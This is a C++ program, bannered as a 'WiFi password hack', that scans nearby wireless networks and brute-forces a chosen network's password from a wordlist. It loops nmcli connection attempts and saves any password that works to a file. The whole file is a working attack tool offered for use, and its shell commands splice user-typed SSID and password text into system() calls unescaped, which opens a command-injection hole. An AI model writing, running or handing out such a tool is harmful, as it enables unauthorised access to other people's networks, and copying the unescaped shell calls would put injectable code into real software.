#include <iostream>
#include <iwlib.h>
#include <string>
#include <fstream>
#include <unistd.h>

using namespace std;

#define RESET   "\033[0m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define CYAN    "\033[36m"
#define BOLD    "\033[1m"

int main() {
    cout << CYAN << BOLD << "===========================================" << endl;
    cout << "        RONNIE HACKER WIFI PASSWORD HACK      " << endl;
    cout << "===========================================" << RESET << endl;

    wireless_scan_head head;
    wireless_scan *result;
    iwrange range;
    int sock;
    string card;

    cout << "SELECT_WIFI_INTERFACE (e.g. wlan0): ";
    getline(cin, card);

    const char *interface = card.c_str(); 
    sock = iw_sockets_open();

    if (sock < 0 || iw_get_range_info(sock, interface, &range) < 0) {
        cerr << RED << "Error: Interface setup fail!" << RESET << endl;
        return 1;
    }

    if (iw_scan(sock, (char *)interface, range.we_version_compiled, &head) < 0) {
        cerr << RED << "Scan fail! Sudo check karein." << RESET << endl;
        return 1;
    }

    cout << YELLOW << "\n--- Available WiFi Networks ---" << RESET << endl;
    result = head.result;
    while (result != NULL) {
        cout << "SSID: " << (result->b.has_essid ? result->b.essid : "Hidden") << endl;
        result = result->next;
    }

    string target_ssid, wordlist_path;
    cout << CYAN << "\nTarget SSID_WIFI_NAME: " << RESET; getline(cin >> ws, target_ssid);
    cout << CYAN << "Wordlist Path: " << RESET; getline(cin >> ws, wordlist_path);

    ifstream file(wordlist_path);
    if (!file.is_open()) {
        cerr << RED << "Wordlist file nahi mili!" << RESET << endl;
        return 1;
    }

    string current_password;
    bool success = false;
    int line_number = 0;

    cout << YELLOW << "\n[!] Attack Start... Stable connection mode enabled." << RESET << endl;

    while (getline(file, current_password)) {
        line_number++;

        if (!current_password.empty() && (current_password.back() == '\r' || current_password.back() == '\n')) {
            current_password.pop_back();
        }

        if (current_password.length() < 8) continue;

        cout <<RED<<line_number << current_password.length() << "] "
             << "TRYING: " << current_password << flush;

      
        system(("nmcli connection delete id \"" + target_ssid + "\" > /dev/null 2>&1").c_str());

    
        string command = "nmcli dev wifi connect \"" + target_ssid + 
                         "\" password \"" + current_password + "\" > /dev/null 2>&1";
        
        int ret = system(command.c_str());

        if (ret == 0) {
            cout << GREEN << " -> [SUCCESS!]" << RESET << endl;
            cout << GREEN << BOLD << "\n[+] Sahi Password Mil Gaya: " << current_password << RESET << endl;
            cout << GREEN << "[+] Wifi " << target_ssid << " se connect ho gaya hai!" << RESET << endl;

          
            ofstream saveFile("found_password.txt", ios::app);
            if (saveFile.is_open()) {
                saveFile << "SSID: " << target_ssid << " | Password: " << current_password << endl;
                saveFile.close();
            }

            success = true;
            break; 
        } else {
            cout << RED << " -> [FAILED]" << RESET << endl;
        }
        
      
        //usleep(10);
        usleep(20000); 
    }

    if (!success) cout << RED << "\n[-] Wordlist khatam. Password nahi mila." << RESET << endl;

    file.close();
    iw_sockets_close(sock);
    return 0;
}
